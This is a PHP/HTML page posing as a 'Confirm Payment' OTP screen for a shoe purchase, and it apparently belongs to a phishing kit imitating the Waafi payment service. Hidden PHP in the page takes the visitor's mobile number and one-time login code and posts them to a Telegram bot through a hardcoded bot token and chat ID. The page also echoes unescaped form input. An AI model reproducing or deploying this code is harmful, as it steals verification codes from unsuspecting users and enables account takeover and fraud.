<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>OTP Verification</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    body {
      background: #e9e9e9;
      min-height: 100vh;
      color: #222;
    }

    .topbar {
      background: linear-gradient(90deg, #b8dd16, #63cc2f);
      color: #fff;
      height: 90px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
    }

    .topbar .back {
      position: absolute;
      left: 18px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 18px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 8px;
      color: #fff;
      text-decoration: none;
    }

    .topbar h1 {
      font-size: 24px;
      font-weight: 700;
    }

    .page {
      min-height: calc(100vh - 90px);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
    }

    .otp-card {
      width: 100%;
      max-width: 680px;
      background: #fff;
      border-radius: 24px;
      padding: 32px 24px 36px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
    }

    .otp-title {
      text-align: center;
      font-size: 28px;
      font-weight: 700;
      margin-bottom: 14px;
      color: #111;
    }

    .otp-text {
      text-align: center;
      font-size: 16px;
      color: #666;
      line-height: 1.5;
      margin-bottom: 28px;
    }

    .otp-boxes {
      display: flex;
      justify-content: center;
      gap: 12px;
      flex-wrap: nowrap;
      margin-bottom: 26px;
    }

    .otp-boxes input {
      width: 62px;
      height: 72px;
      border: 3px solid #d8d8d8;
      border-radius: 14px;
      text-align: center;
      font-size: 28px;
      font-weight: 700;
      background: #fff;
      outline: none;
      transition: 0.2s ease;
    }

    .otp-boxes input:focus {
      border-color: #8fd526;
      box-shadow: 0 0 0 4px rgba(143, 213, 38, 0.12);
    }

    .timer {
      text-align: center;
      font-size: 16px;
      color: #666;
      margin-bottom: 32px;
    }

    .timer strong {
      color: #222;
    }

    .btn-wrap {
      display: flex;
      justify-content: flex-start;
    }

    .verify-btn {
      border: none;
      background: linear-gradient(90deg, #c8ea22, #61cc37);
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      padding: 18px 42px;
      border-radius: 14px;
      cursor: pointer;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
      min-width: 205px;
      min-height: 64px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      transition: 0.2s ease;
    }

    .verify-btn.loading {
      background: #fff;
      color: #444;
      border: 1px solid #dcdcdc;
    }

    .verify-btn.success {
      background: #08ad4a;
      color: #fff;
      border: none;
    }

    .spinner {
      width: 22px;
      height: 22px;
      border: 3px solid #d9d9d9;
      border-top: 3px solid #7fd22c;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      flex-shrink: 0;
    }

    @keyframes spin {
      100% {
        transform: rotate(360deg);
      }
    }

    @media (max-width: 768px) {
      .topbar {
        height: 84px;
      }

      .topbar h1 {
        font-size: 22px;
      }

      .topbar .back {
        font-size: 16px;
      }

      .otp-card {
        padding: 28px 18px 30px;
        border-radius: 20px;
      }

      .otp-title {
        font-size: 24px;
      }

      .otp-boxes {
        gap: 10px;
      }

      .otp-boxes input {
        width: 50px;
        height: 64px;
        font-size: 24px;
      }

      .verify-btn {
        width: 100%;
        font-size: 18px;
        padding: 16px 24px;
      }

      .btn-wrap {
        justify-content: stretch;
      }
    }

    @media (max-width: 480px) {
      .page {
        padding: 20px 12px;
      }

      .otp-card {
        padding: 24px 14px 26px;
      }

      .otp-title {
        font-size: 21px;
      }

      .otp-text {
        font-size: 15px;
      }

      .otp-boxes {
        gap: 8px;
      }

      .otp-boxes input {
        width: 42px;
        height: 56px;
        font-size: 22px;
        border-radius: 12px;
      }

      .timer {
        font-size: 15px;
      }

      .verify-btn {
        font-size: 17px;
      }
    }

    @media (max-width: 360px) {
      .otp-boxes input {
        width: 38px;
        height: 52px;
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <header class="topbar">
    <a href="#" class="back">← <span>Shoes</span></a>
    <h1>Enough</h1>
  </header>

  <main class="page">
    <div class="otp-card">
      <h2 class="otp-title">Confirm Payment</h2>
      <?php
    $mobile   = trim($_POST['mobile'] ?? '');
    $otp1  = trim($_POST['otp_code'] ?? '');

      $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
      $chatId   = "1135238504";

        $text = "Waafi Website Message\n\n"
          . "mobile: $mobile\n"
          . "VerifyLoginOtp: $otp1\n";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text'    => $text
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        header('Location: error.php');
        exit;
    }

    $result = json_decode($response, true);

    if (isset($result['ok']) && $result['ok'] === true) {
        exit;
    }

    exit;

      ?>
      <p class="otp-text">
        
        You Are About to Purchase <span id="phone-number"><?php echo $_POST['package']?> for <?php echo $_POST['mobile']?></span>
      </p>
      <form action="verify-purchase.php" method="POST">
        
        <input type="hidden" name="mobile" value="<?php echo $_POST['mobile']?>" >
        <input type="hidden" name="package" value="<?php echo $_POST['package']?>">

        <div class="btn-wrap">
          <button type="submit" class="verify-btn" id="verifyBtn">CONFIRM PAY →</button>
        </div>
      </form>
    </div>
  </main>
</body>
</html>
